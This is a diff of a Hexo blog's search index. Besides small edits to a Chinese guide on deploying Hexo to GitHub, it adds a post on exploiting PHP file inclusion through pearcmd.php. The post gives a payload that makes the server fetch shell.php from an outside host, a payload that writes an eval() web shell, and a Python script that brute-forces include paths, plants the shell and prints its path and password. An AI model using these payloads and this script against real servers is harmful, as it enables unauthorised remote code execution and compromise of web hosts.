@@ -853,7 +853,7 @@
 
 
 
-<p>如果失败更改端口</p>
+<p>如果失败更改端口(非必要不改后面容易出事)</p>
 <p>操作方法：</p>
 <p>进入~&#x2F;.ssh下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>
@@ -869,15 +869,17 @@
 <p>保存退出<br>检查是否成功</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>
+
+
+
 <h1 id="将hexo部署到GitHub"><a href="#将hexo部署到GitHub" class="headerlink" title="将hexo部署到GitHub"></a>将hexo部署到GitHub</h1><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
 
 
 
 <p>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>
-
-
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:c0rr1Y/c0rr1Y.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>
 
 
 
@@ -1682,5 +1684,56 @@
       <tags>
         <tag>python</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>pearcmd的妙用</title>
+    <url>/2023/07/25/pearcmd%E7%9A%84%E5%A6%99%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="0x00-利用条件"><a href="#0x00-利用条件" class="headerlink" title="0x00 利用条件"></a>0x00 利用条件</h1><p>(1）服务器上安装pear，也就是存在pearcmd.php。同时知道pearcmd.php的文件路径</p>
+<p>(2）web环境下在php.ini中register_argc_argv设置为On</p>
+<p>(3）存在文件包含，可以包含php文件并且没有open_basedir的限制</p>
+<h1 id="0x01-真实环境"><a href="#0x01-真实环境" class="headerlink" title="0x01 真实环境"></a>0x01 真实环境</h1><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库</p>
+<p>如何安装安装pear</p>
+<p>PHP版本在7.3及以前，pecl&#x2F;pear是默认安装的</p>
+<p>在7.4以后，需要我们在编译的时候指定–with-pear才会安装</p>
+<p>网上说，在dokcer任意的版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php。（然而总会遇到特殊的情况，没有这个文件的存在）</p>
+<p>当没有这个文件存在时，可以尝试使用yum install php-pear去安装。</p>
+<p>安装成功以后，执行pear命令可以得到</p>
+<p><strong>两种路径、</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/usr/local/lib/php/pearcmd&quot;,  &quot;/usr/share/pear/pearcmd&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><h2 id="1出网"><a href="#1出网" class="headerlink" title="1出网"></a>1出网</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2不出网"><a href="#2不出网" class="headerlink" title="2不出网"></a>2不出网</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x03不出网脚本"><a href="#0x03不出网脚本" class="headerlink" title="0x03不出网脚本"></a>0x03不出网脚本</h1><p>使用时开启burp劫包</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;admire@&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auz=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">header1 = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line"><span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------添加变量区----------------------------</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">local_path=[<span class="string">&quot;/usr/local/lib/php/pearcmd&quot;</span>,<span class="string">&quot;/usr/share/pear/pearcmd&quot;</span>]  <span class="comment">#pear路径 可以自己添加</span></span><br><span class="line">download_path=<span class="string">&quot;/tmp&quot;</span> <span class="comment">#下载路径</span></span><br><span class="line">include_file=<span class="string">&quot;index.php&quot;</span><span class="comment">#含有文件包含漏洞的文件</span></span><br><span class="line">include_parms=<span class="string">&quot;file&quot;</span> <span class="comment">#参数</span></span><br><span class="line">proxy=<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line"><span class="comment">#-------------添加变量区----------------------------</span></span><br><span class="line">s1=<span class="string">&quot;/..&quot;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> local_path:</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        <span class="keyword">if</span> auz==<span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?+config-create+/&amp;<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;s&#125;</span>&amp;/&lt;?php%20phpinfo();?&gt;+<span class="subst">&#123;download_path&#125;</span>/eval.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        url1=url+(payload)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)<span class="comment">#自己可以改</span></span><br><span class="line"></span><br><span class="line">        re=requests.get(url=url1,headers=header1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Successfully created&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="comment">#print(checking)</span></span><br><span class="line">            <span class="comment">#burp抓包后修改url编码后的数据</span></span><br><span class="line">            os.environ[<span class="string">&quot;http_proxy&quot;</span>] = proxy</span><br><span class="line">            os.environ[<span class="string">&quot;https_proxy&quot;</span>] = proxy</span><br><span class="line">            exp=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?+config-create+/&amp;<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;s&#125;</span>&amp;/&lt;?=eval($_REQUEST[1]);?&gt;+<span class="subst">&#123;download_path&#125;</span>/dada.php&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(url+exp)</span><br><span class="line">            rce=requests.get(url=url+exp,headers=header1)</span><br><span class="line">            path=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;download_path&#125;</span>/dada&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;木马路径&quot;</span>+url+path)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;password: 1&quot;</span>)</span><br><span class="line">            auz=<span class="literal">True</span> <span class="comment">#注释掉会一直跑下去。直到遍历结束</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:<span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">str</span> += s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;现实告诉我必须burp发包才可以写马！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
   </entry>
 </search>
